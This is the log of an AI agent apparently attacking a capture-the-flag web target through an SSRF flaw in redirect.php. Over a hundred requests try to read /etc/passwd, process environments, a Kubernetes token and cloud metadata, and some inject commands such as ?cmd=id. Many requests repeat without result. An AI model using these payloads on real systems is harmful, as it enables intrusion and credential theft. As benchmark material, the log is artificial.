@@ -1,0 +1,238 @@
+[0m
+> build · qwen/qwen3.6-plus
+[0m
+[0m⚙ [0mpentest-agent_session {"action":"start","options":"{\"target\": \"http://172.17.0.1:42601\", \"depth\": \"thorough\", \"max_time_minutes\": 60}"}
+[0m✗ [0mskill failed
+[91m[1mError: [0mSkill "pentester" not found. Available skills: network-assess, email-security, credential-audit, ai-redteam, ad-assessment, osint, web-exploit, request-cves, metasploit, lateral-movement, ssl-tls-audit, codebase, cloud-security, api-security, reverse-shell, threat-modeling, container-k8s-security, colang-gen, post-exploit, gh-export
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601","method":"GET"}
+[0m⚙ [0mpentest-agent_scan {"tool":"nmap","target":"172.17.0.1","flags":"-sV -sC --top-ports 1000"}
+[0m⚙ [0mpentest-agent_scan {"tool":"spider","target":"http://172.17.0.1:42601","flags":"depth=3"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://localhost","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://127.0.0.1","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/admin","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/secret","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/config","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///etc/passwd","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/redirect.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///root/flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/.env","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/index.html","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/.git/config","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/api/flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/source","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/backup","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/data","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://127.0.0.1:80","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service:8080","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service:3000","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/secret.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/flag.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/config.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/robots.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/sitemap.xml","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/hints","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=dict://internal-service:80/info","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=gopher://internal-service:80/_test","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/flag.html","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/secret.html","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/admin.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/index.php.bak","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/flag.json","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/api/v1/flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/index.php%00","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/secret","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/hidden","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/internal.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/app.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/main.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///proc/self/environ","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/.env","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///etc/environment","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/internal","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/flag.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/source.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/config.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/secret_flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/internal-service/index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/internal/index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/internal-service/index.html","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///proc/1/environ","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/config.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/..%2f","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/index","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/index.php%3f","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/?show_source","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/?source","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/index.php~","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/.index.php.swp","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/index.php.bak","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/flag.html","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/flag.json","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/index.php","method":"GET","headers":"{\"X-Forwarded-For\": \"127.0.0.1\"}"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/admin","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/secret","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/api","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/health","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/info","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service:8080","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service:3000","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service:5000","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/internal-service/index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/internal-service/index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///etc/hosts","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/index.php.bak","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://internal-service/.env","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.1","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.3","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.1","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/secret","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/admin","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/internal-service/index.html","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/internal-service/","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php.bak","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/.env","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/config.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php~","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/.index.php.swp","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/robots.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/.git/config","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/secret.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?debug","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?view-source","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/flag.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://169.254.169.254/latest/meta-data/","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///app/config.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?source","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?show_source","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?debug=1","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/getflag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.1:8080","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.1:3000","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.1:5000","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/.env","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/config.json","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///proc/1/cmdline","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///app/index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/flag.html","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/secret.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/api/flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?page=php://filter/convert.base64-encode/resource=index","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/internal-service/index.html","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///proc/1/environ","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///proc/self/environ","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///etc/apache2/sites-enabled/000-default.conf","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/secret","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/admin","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?view-source","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?show=source","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?page=php://filter/convert.base64-encode/resource=index","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/internal-service/index.html","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///opt/flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///tmp/flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///home/flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?page=php://filter/convert.base64-encode/resource=index","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?source","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?page=php://filter/convert.base64-encode/resource=index","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_scan {"tool":"nmap","target":"172.21.0.2","flags":"-sV -sC -p- --top-ports 100","options":"{\"ports\": \"top-100\"}"}
+[0m⚙ [0mpentest-agent_scan {"tool":"nmap","target":"172.21.0.3","flags":"-sV -sC -p- --top-ports 100","options":"{\"ports\": \"top-100\"}"}
+[0m⚙ [0mpentest-agent_scan {"flags":"-sV -sC -p 1-100","options":"{}","target":"172.21.0.2","tool":"nmap"}
+[0m⚙ [0mpentest-agent_scan {"flags":"-sV -sC -p 1-100","options":"{}","target":"172.21.0.3","tool":"nmap"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php.bak","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/.index.php.swp","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/flag.php","method":"GET"}
+[0m
+[0m$ [0mecho "FLAG: " | grep -oP 'flag\{[^}]+\}'
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?page=php://filter/convert.base64-encode/resource=index","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/robots.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?page=php://filter/convert.base64-encode/resource=index","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/secret","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/api","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/get-flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/api/v1/flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?page=php://filter/convert.base64-encode/resource=index","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/.env","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?page=php://filter/convert.base64-encode/resource=index","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/internal-service/index.html","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?page=php://filter/convert.base64-encode/resource=index","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?page=php://filter/convert.base64-encode/resource=index","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/internal-service/index.html","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/server-status","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/server-info","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/.htaccess","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?cmd=id","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?exec=cat+/flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.html","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?page=php://filter/convert.base64-encode/resource=index","method":"GET"}
